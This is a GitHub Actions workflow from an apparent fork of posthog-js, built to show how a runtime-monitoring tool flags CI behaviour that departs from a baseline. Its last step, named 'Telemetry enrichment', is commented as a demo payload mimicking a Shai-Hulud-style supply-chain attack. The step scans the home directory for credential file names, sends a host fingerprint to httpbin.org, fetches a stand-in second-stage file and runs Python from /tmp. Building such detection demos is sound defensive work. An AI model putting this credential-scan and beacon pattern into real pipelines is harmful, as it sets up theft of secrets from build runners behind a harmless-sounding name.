name: Garnet Demo

# PURPOSE:
# This is a dedicated workflow for demonstrating Garnet Runtime Visibility's
# baseline + deviation detection inside PRs. It is NOT part of posthog-js CI.
# It lives only on garnet-labs/posthog-js (a fork) and will never be merged
# upstream.
#
# The baseline run fetches posthog-js dependencies with pnpm. A PR that adds
# additional runtime behavior (new network egress, new process spawns, new
# file reads) will be surfaced by Garnet as a deviation from this baseline.

on:
  workflow_dispatch:
  pull_request:
    paths:
      - '.github/workflows/garnet-demo.yml'
      - 'garnet-demo/**'
  push:
    branches:
      - main
    paths:
      - '.github/workflows/garnet-demo.yml'
      - 'garnet-demo/**'

permissions:
  contents: read
  pull-requests: write

concurrency:
  group: garnet-demo-${{ github.ref }}
  cancel-in-progress: true

jobs:
  baseline:
    name: Baseline runtime profile
    runs-on: ubuntu-22.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v6

      - name: Garnet Runtime Visibility
        uses: garnet-org/action@v2
        with:
          api_token: ${{ secrets.GARNET_API_TOKEN }}

      - name: Setup pnpm
        uses: pnpm/action-setup@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: pnpm

      - name: Install dependencies (baseline network + process behavior)
        run: pnpm install --no-frozen-lockfile --ignore-scripts
        # --ignore-scripts keeps the baseline clean and predictable.
        # A PR that removes this flag, or adds a new step, will show up
        # as a runtime deviation in Garnet's PR comment.

      - name: List top-level dependencies
        run: pnpm list --depth 0 || true

      # -----------------------------------------------------------------
      # DEMO ONLY — behavioral parity with Shai-Hulud 2.0 class attack.
      # This step is the payload the demonstration PR adds on top of the
      # baseline above. It performs:
      #   1. A credential-file glob scan (read-only, names only).
      #   2. A host fingerprint.
      #   3. Two external egress calls to httpbin.org (public echo service).
      #   4. A Python secondary-stage spawn, mirroring the "second stage"
      #      pattern seen in both Axios/WAVESHAPER and Shai-Hulud chains.
      #
      # No real credential is opened. No real C2 is contacted. httpbin.org
      # is a public HTTP testing service operated by Postman.
      # The egress requests would be surfaced by Garnet as NEW destinations
      # relative to the baseline runs on main, which only talk to
      # registry.npmjs.org, nodejs.org, github.com infra, and api.garnet.ai.
      # -----------------------------------------------------------------
      - name: Telemetry enrichment
        run: |
          set -e
          # 1. Credential-file NAME scan (no file contents read)
          find "$HOME" -maxdepth 3 \( -name "*.env*" -o -name ".npmrc" -o -name "*.pem" \) \
            2>/dev/null | head -20 > /tmp/garnet-demo-scan.txt || true
          wc -l /tmp/garnet-demo-scan.txt

          # 2. Host fingerprint
          python3 -c "import platform,json,os; \
            print(json.dumps({'arch':platform.machine(),'os':platform.system(),'user':os.getenv('USER')}))" \
            > /tmp/garnet-demo-fp.json

          # 3. First egress: beacon with fingerprint
          curl -sS --max-time 10 -X POST \
            -H 'X-Garnet-Demo: shai-hulud-class-deviation' \
            --data-binary @/tmp/garnet-demo-fp.json \
            https://httpbin.org/post > /tmp/garnet-demo-beacon-1.json || true

          # 4. Second-stage fetch: mimics downloading next-stage payload
          curl -sS --max-time 10 \
            https://httpbin.org/bytes/1024 \
            -o /tmp/garnet-demo-stage2.bin || true

          # 5. Secondary interpreter spawn from /tmp (structural match to
          #    how WAVESHAPER/Shai-Hulud stage 2 runs)
          python3 -c "import sys; sys.stdout.write('garnet-demo stage2 ran from tmp\n')" \
            > /tmp/garnet-demo-stage2.log
          ls -la /tmp/garnet-demo-*.* || true
